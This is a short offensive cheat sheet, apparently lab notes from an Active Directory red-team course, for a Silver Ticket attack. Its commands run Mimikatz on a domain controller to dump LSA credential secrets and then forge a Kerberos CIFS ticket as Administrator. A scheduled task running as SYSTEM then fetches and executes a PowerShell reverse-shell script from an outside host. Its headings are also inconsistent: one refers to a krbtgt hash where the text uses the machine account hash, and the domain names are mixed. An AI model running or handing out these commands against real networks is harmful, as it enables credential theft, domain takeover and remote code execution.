# Silver Ticket 

## Execute mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

## Using hash of the Domain Controller computer account, below command provides access to shares on the DC
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:ad.domain.local /sid:<sid> /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:<rc4-hash> /user:Administrator /ptt"'
```

## Schedule and execute a task
```powershell
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8080/Invoke-PowerShellTcp.psi''')'"

schtasks /Run /S ad.domain.local /TN "STCheck"
```
